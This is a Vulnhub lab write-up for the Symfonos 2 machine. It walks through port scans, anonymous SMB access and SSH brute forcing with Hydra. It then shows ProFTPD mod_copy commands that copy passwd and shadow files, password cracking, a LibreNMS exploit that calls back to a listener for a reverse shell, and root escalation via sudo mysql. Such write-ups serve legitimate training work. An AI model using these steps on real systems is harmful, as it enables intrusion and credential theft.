---
layout: default
title : muzec - Symfonos 2 Vulnhub Writeup
---

![image](https://user-images.githubusercontent.com/69868171/157857545-a60d0841-495b-4591-a13b-036ac2be8fb2.png)

Symfonos 2 is here to be pwned by you man XD.

We always start with an nmap scan.....

```
nmap -p- --min-rate 10000 -oN nmap/fullport.tcp -v 172.16.139.168
```

```
# Nmap 7.91 scan initiated Fri Mar  4 07:49:04 2022 as: nmap -p- --min-rate 10000 -oN nmap/fullport.tcp -v 172.16.139.168
Nmap scan report for 172.16.139.168
Host is up (0.00018s latency).
Not shown: 65530 closed ports
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
80/tcp  open  http
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Read data files from: /usr/bin/../share/nmap
# Nmap done at Fri Mar  4 07:49:07 2022 -- 1 IP address (1 host up) scanned in 2.22 seconds
```

Some cool ports i guess now some default nmap scripts and service detection on it.

```
nmap -sC -sV -oN nmap/normal.tcp -p 21,22,80,139,445 172.16.139.168
```

```
# Nmap 7.91 scan initiated Fri Mar  4 07:49:45 2022 as: nmap -sC -sV -oN nmap/normal.tcp -p 21,22,80,139,445 172.16.139.168
Nmap scan report for 172.16.139.168
Host is up (0.00035s latency).

PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         ProFTPD 1.3.5
22/tcp  open  ssh         OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 9d:f8:5f:87:20:e5:8c:fa:68:47:7d:71:62:08:ad:b9 (RSA)
|   256 04:2a:bb:06:56:ea:d1:93:1c:d2:78:0a:00:46:9d:85 (ECDSA)
|_  256 28:ad:ac:dc:7e:2a:1c:f6:4c:6b:47:f2:d6:22:5b:52 (ED25519)
80/tcp  open  http        WebFS httpd 1.21
|_http-server-header: webfs/1.21
|_http-title: Site doesn't have a title (text/html).
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.5.16-Debian (workgroup: WORKGROUP)
Service Info: Host: SYMFONOS2; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 4h59m42s, deviation: 3h27m50s, median: 2h59m42s
|_nbstat: NetBIOS name: SYMFONOS2, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.5.16-Debian)
|   Computer name: symfonos2
|   NetBIOS computer name: SYMFONOS2\x00
|   Domain name: \x00
|   FQDN: symfonos2
|_  System time: 2022-03-04T03:49:42-06:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2022-03-04T09:49:42
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Mar  4 07:50:04 2022 -- 1 IP address (1 host up) scanned in 19.24 seconds
```

Now that is more better i always stated to start with low hanging fruit like `FTP, SMB` and seems we have both but seems we have no anonymous access to FTP let check `SMB` .

```
┌──(muzec㉿Muzec-Security)-[~/Documents/Vulnhubs/symfonos2]
└─$ smbclient -L //172.16.109.163/ -N       

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        anonymous       Disk      
        IPC$            IPC       IPC Service (Samba 4.5.16-Debian)
SMB1 disabled -- no workgroup available
                                                                                                                                                                       
┌──(muzec㉿Muzec-Security)-[~/Documents/Vulnhubs/symfonos2]
└─$ 
```

Now seems we have anonymous access to a disk let go ahead and see what we have in it.

```
┌──(muzec㉿Muzec-Security)-[~/Documents/Vulnhubs/symfonos2]
└─$ smbclient  //172.16.109.163/anonymous -N 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Jul 18 15:30:09 2019
  ..                                  D        0  Thu Jul 18 15:29:08 2019
  backups                             D        0  Thu Jul 18 15:25:17 2019

                19728000 blocks of size 1024. 16313236 blocks available
smb: \> cd backups
smb: \backups\> ls
  .                                   D        0  Thu Jul 18 15:25:17 2019
  ..                                  D        0  Thu Jul 18 15:30:09 2019
  log.txt                             N    11394  Thu Jul 18 15:25:16 2019

                19728000 blocks of size 1024. 16313236 blocks available
smb: \backups\> get log.txt
getting file \backups\log.txt of size 11394 as log.txt (370.9 KiloBytes/sec) (average 370.9 KiloBytes/sec)
smb: \backups\> 

```

Now we found a `log.txt` so i downloaded it on our attacking machine to see what we have in the `log.txt` file.

![image](https://user-images.githubusercontent.com/69868171/157862394-868d209e-9de8-4881-bf38-9ee5607595de.png)

Now that is interesting it both `SMB, FTP` logs file going through it i found a username.

![image](https://user-images.githubusercontent.com/69868171/157862549-260e829a-e5cc-4971-aa73-ec1c5e56461b.png)

Now that is a lead i guess so i start brute forcing `SSH` and leave it running in the background now back to the `FTP` seems we know the version let do some research on it.


```
┌──(muzec㉿Muzec-Security)-[~/Documents/Vulnhubs/symfonos2]
└─$ hydra -l aeolus -P passwordlist.txt ssh://172.16.109.163 -t 4
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-03-11 09:58:59
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 4 tasks per 1 server, overall 4 tasks, 70188 login tries (l:1/p:70188), ~17547 tries per task
[DATA] attacking ssh://172.16.109.163:22/
```

![image](https://user-images.githubusercontent.com/69868171/157863305-52a9c45a-0008-43dc-9445-98e3a90492e9.png)

Now that is an exploit we can use to copy the backup `shadow` file.

![image](https://user-images.githubusercontent.com/69868171/157863687-0a19eda3-ee71-409b-a2f6-f0eb71003b43.png)

So when going through the exploit seems it possible to copy a file on the target seems we know the path of the share we have access to on `SMB` it possible to copy the `shadow.bak` file to the anonymous share we have access to.

![image](https://user-images.githubusercontent.com/69868171/157866709-9bb52e25-6d26-416e-9e53-1abc69c9d60d.png)

```
telnet 172.16.109.163 21

site cpfr /etc/passwd

site cpto /home/aeolus/share/passwd.bak
```


![image](https://user-images.githubusercontent.com/69868171/157866882-699c31d9-327d-4005-b172-f0e98c80a93a.png)

Now that confirm it let copy the shadow file backup now.

![image](https://user-images.githubusercontent.com/69868171/157867270-506c265e-1d02-478f-b57c-3b67511e0b6e.png)

Now we have it still confuse how i know about the backup shadow file check the `log.txt` again screenshot below.

![image](https://user-images.githubusercontent.com/69868171/157867530-c1a702e5-db49-4f2d-8327-076b9b1abbe0.png)

Now you have it.

![image](https://user-images.githubusercontent.com/69868171/157867647-0b48bc72-4b95-4ee7-b04f-38a431879bb6.png)

Now we have the hashes let crack it with `john the ripper` when running in the background let try something on the `proFTPD` exploit to see if we can get RCE.

```
┌──(muzec㉿Muzec-Security)-[~/Documents/Vulnhubs/symfonos2]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt shadow.bak
```

Now back to `proFTPD` RCE.

![image](https://user-images.githubusercontent.com/69868171/157868391-fb8cbd12-1fb3-4fff-a747-57f928f3b837.png)


But seems it a deadend we have no write access, permission on `/var/wwww/html` now back to the shadow file that we are cracking.

```
┌──(muzec㉿Muzec-Security)-[~/Documents/Vulnhubs/symfonos2]
└─$ john --show shadow.bak
aeolus:sergioteamo:18095:0:99999:7:::

1 password hash cracked, 2 left
```

Only one of the user hash was cracked which is `aeolus` time to SSH into the target XD.

![image](https://user-images.githubusercontent.com/69868171/157872695-df0e24c4-a76f-4f0b-80f2-bd50c0b2c997.png)

We are in now more enumeration. Checkig `SUID` and `Sudo` .

```
aeolus@symfonos2:~$ find / -perm -u=s -type f 2>/dev/null
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/sbin/exim4
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/gpasswd
/bin/mount
/bin/su
/bin/ping
/bin/umount
```

![image](https://user-images.githubusercontent.com/69868171/157875914-75d9830a-c0d5-428c-b29a-d3f5749e641b.png)

But seems user `aeolus` can't run `sudo` it time to keep moving forward let check if we have any local port running on the target.

```
aeolus@symfonos2:~$ ss -tulpn
Netid State      Recv-Q Send-Q                                    Local Address:Port                                                   Peer Address:Port              
udp   UNCONN     0      0                                                     *:68                                                                *:*                  
udp   UNCONN     0      0                                                     *:68                                                                *:*                  
udp   UNCONN     0      0                                        172.16.109.255:137                                                               *:*                  
udp   UNCONN     0      0                                        172.16.109.163:137                                                               *:*                  
udp   UNCONN     0      0                                                     *:137                                                               *:*                  
udp   UNCONN     0      0                                        172.16.109.255:138                                                               *:*                  
udp   UNCONN     0      0                                        172.16.109.163:138                                                               *:*                  
udp   UNCONN     0      0                                                     *:138                                                               *:*                  
udp   UNCONN     0      0                                                     *:161                                                               *:*                  
tcp   LISTEN     0      80                                            127.0.0.1:3306                                                              *:*                  
tcp   LISTEN     0      50                                                    *:139                                                               *:*                  
tcp   LISTEN     0      128                                           127.0.0.1:8080                                                              *:*                  
tcp   LISTEN     0      32                                                    *:21                                                                *:*                  
tcp   LISTEN     0      128                                                   *:22                                                                *:*                  
tcp   LISTEN     0      20                                            127.0.0.1:25                                                                *:*                  
tcp   LISTEN     0      50                                                    *:445                                                               *:*                  
tcp   LISTEN     0      50                                                   :::139                                                              :::*                  
tcp   LISTEN     0      64                                                   :::80                                                               :::*                  
tcp   LISTEN     0      128                                                  :::22                                                               :::*                  
tcp   LISTEN     0      20                                                  ::1:25                                                               :::*                  
tcp   LISTEN     0      50                                                   :::445                                                              :::*                  
aeolus@symfonos2:~$ 
```

Nice guess seems we have a port running locally which is `8080` let quickly port forward to be able to access it at our end.

```
┌──(muzec㉿Muzec-Security)-[~/Documents/Vulnhubs/symfonos2]
└─$ ssh -L 8080:127.0.0.1:8080 aeolus@172.16.109.163
aeolus@172.16.109.163's password: 
Linux symfonos2 4.9.0-9-amd64 #1 SMP Debian 4.9.168-1+deb9u3 (2019-06-16) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Fri Mar 11 04:21:32 2022 from 172.16.109.1
aeolus@symfonos2:~$ 
```

![image](https://user-images.githubusercontent.com/69868171/157877092-9a500700-f4e6-4f28-8e85-0f711f5f4ecd.png)

Now we are talking `LibreNMS` should be cool to exploit but we need to get in first let try some default credentials and password reused.

![image](https://user-images.githubusercontent.com/69868171/157877308-f0c38a55-93c6-4064-8d3a-c584520eea48.png)

But no way a slap back now let try the credentials we have on it.

```
aeolus:sergioteamo
```

![image](https://user-images.githubusercontent.com/69868171/157877489-a365f1bd-c968-49e1-8983-23a4b9bbfb3c.png)

Mama we are in XD now let look around what version is it running is it and is it vulnerable let do some research.

![image](https://user-images.githubusercontent.com/69868171/157878266-7fa2789c-36dc-41cf-b7d1-6d37695e7b7d.png)

Downloaded and ready to run.

```
┌──(muzec㉿Muzec-Security)-[~/Documents/Vulnhubs/symfonos2]
└─$ python 47044.py http://127.0.0.1:8080/ "librenms_session=eyJpdiI6IkwwZFI4bktlSGU1d01JVTlIbGE3Tnc9PSIsInZhbHVlIjoiOHV0QWxUZVlTVm0zU2JSZEVFXC94SDYxXC9wcnpDSHVmUllKUWhNUkFjT1ZLZG5VeFcrbE5iNlR5bG9VaUFwUmNGM0VVb0tJQm9PQ2FoT2gySGxPUEh4QT09IiwibWFjIjoiODJlMTZkOGE2ZDc0ZTNiYjBkOTVlZWQwZjBhNjBiNzdkYTY5ZmEzYzI0N2Q0NDk4NDkzNzVhNTQ4OTFkMWQxOSJ9;PHPSESSID=n7m2rbfrv8fnl4209q1auu3fa3;XSRF-TOKEN=eyJpdiI6InFVUVVnc1VGaGVqTXM1R1plXC9HUWNRPT0iLCJ2YWx1ZSI6IjR5T0JWcytlWFwvcEZXdkFyOXRQKzVzNUp6Vjh1QjJWQWg0ajdGWVYxUDY1RDgzY044ZEhYVW1CTnNkaFhWanZOeEpHUUxYdU5vYjE5eWowZkFCSW14QT09IiwibWFjIjoiMDFjOGQ2MzZjM2Q2NjM3MDUxMmM2M2FlNDVhODJmMGIyMGQzMjgyYzkxYzkzMzAwMzg2ZDkwZWVhOWE0MWU5OCJ9" 172.16.109.1 1337
```

![image](https://user-images.githubusercontent.com/69868171/157879405-08409578-00fa-492d-bd3c-46761b84e169.png)

Boom we have shell let spawn a full tty shell to make it more stable to use.

![image](https://user-images.githubusercontent.com/69868171/157879776-0f049d10-a2d0-4b25-a44a-cf4598ae867e.png)

More better now checking `sudo` and boom seems we can run `mysql` .

![image](https://user-images.githubusercontent.com/69868171/157879883-7e8cc76e-1203-40cf-9b14-dc44b7901764.png)

```
sudo /usr/bin/mysql
```

![image](https://user-images.githubusercontent.com/69868171/157881282-78c8ac26-da97-4345-b8ab-42802254fcad.png)

```
system id
```

We can see that we are `root` now let drop into it.

```
system bash
```

![image](https://user-images.githubusercontent.com/69868171/157881454-7628a9b3-2c3c-42fa-9bf2-574927e3976c.png)

We are rooooooooooooooooooot now let get the `proof.txt` .

```
cat proof.txt;hostname;id;whoami;ip addr
```

![image](https://user-images.githubusercontent.com/69868171/157881851-cc389fc6-6c82-4d8d-883e-b27759d67ea9.png)

### Little Extra Spicy XD

Back to our brute forcing we background when working on the target.


![image](https://user-images.githubusercontent.com/69868171/157882060-cf29458c-ef7e-43d1-aade-1176366276fe.png)

I was able to get the password for `aeolus` by brute forcing both `FTP, SSH` probably it going to take some time 30-40min .

We are done.

Greeting From [Muzec](https://twitter.com/muzec_saminu)

<br> <br>
[Back To Home](../index.md)
<br>
